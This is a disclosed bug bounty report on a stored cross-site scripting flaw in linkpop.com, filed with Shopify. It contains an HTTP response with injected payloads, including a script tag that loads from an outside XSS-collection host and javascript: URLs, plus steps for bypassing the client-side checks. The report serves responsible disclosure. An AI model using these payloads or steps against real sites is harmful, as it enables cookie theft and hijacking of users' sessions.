# Stored XSS at https://linkpop.com

## Report Details
- **Report ID**: 1441988
- **URL**: https://hackerone.com/reports/1441988
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-05T19:15:00.304Z
- **Disclosed**: 2022-01-20T19:08:52.986Z

## Reporter
- **Username**: nagli
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify

## Vulnerability Information
## Summary:

There is Stored XSS vulnerability at 

`https://linkpop.com/dashboard/admin` that can later be delivered through unique linkpop link.

This is due to lack of sanitizaiton and relying on client side protections when inserting urls to our applications.

This is the client side protection error:

{F1569111}

Easily bypassed just by tampering with burp

```
HTTP/1.1 200 OK
Cookies

{"data":{"pageUpdate":{"page":{"id":"12617","slug":"testnaglinagli","title":"\"\u003e\u003ch1\u003enagli\u003c/h1\u003e\"\u003e\u003cscript sr","bio":"\"\u003e\u003cScript src=https://naglinagli.xss.ht\u003e\u003c/script\u003e${7*7}{{7*7}}","media":{"id":"36361","signedBlobId":"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBZ21PIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--84ffd51a70b79ab6faaec2d6c3e7cca38f907f30","url":"https://cdn.shopify.com/b/shopify-linkpop-prod/q85t5nppud8qfjo1dvg0ql3p01oe.png","__typename":"Media"},"themeSettings":{"backgroundColor":"#F0EFEC","fontColor":"#000","primaryFont":"Roboto","secondaryFont":""},"__typename":"Page"},"errors":null,"__typename":"PageUpdatePayload"},"linksCreate":{"page":{"id":"12617","links":[{"id":"254183","title":"\"\u003e\u003ch1\u003etesT\u003c/h1\u003e${7*7}{{7*7}}","url":"javascript:alert(document.domain)","media":{"id":"36362","signedBlobId":"eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBZ3FPIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--54c67556358d19ddba24dd01f4130d1b2641b16f","url":"https://cdn.shopify.com/b/shopify-linkpop-prod/u7qrfhm16ma74bf3tvwn2lun4vn1.png","__typename":"Media"},"__typename":"ExternalLink"}],"socialMediaAccounts":[{"id":"30879","handle":"javascript:alert(1)","network":"facebook","__typename":"SocialMediaAccount"},{"id":"30878","handle":"javascript:alert(1)","network":"shop","__typename":"SocialMediaAccount"}],"__typename":"Page"},"errors":null,"__typename":"LinksCreatePayload"}}}
```

{F1569112}

{F1569113}

I reached this service of yours through some manual navigations on shopify.com and shopifycloud.com, I can see that it's also whitelisted on your OAuth redirects.

## Steps To Reproduce:
[add details for how we can reproduce the issue]

  1. Navigate to www.linkpop.com
  2. Login to your account
  3. Create new template
  4. Capture the request, change the "url" param to javascript:alert(document.domain)
  5. Click on "Copy Link"
  6. Now you have shareable link - click on the first image -> https://linkpop.com/testnaglinagli

The XSS worked for me on FireFox.

Best Regards

@nagli

## Impact

Cookies Exfiltration
CORS Bypass
SOAP Bypass
Executing Javascript on the victims behalf.

## Attachments
- Screen_Shot_2022-01-05_at_21.08.31.png
- Screen_Shot_2022-01-05_at_21.12.07.png
- Screen_Recording_2022-01-05_at_21.08.54.mov
- Screen_Shot_2022-01-05_at_21.13.29.png
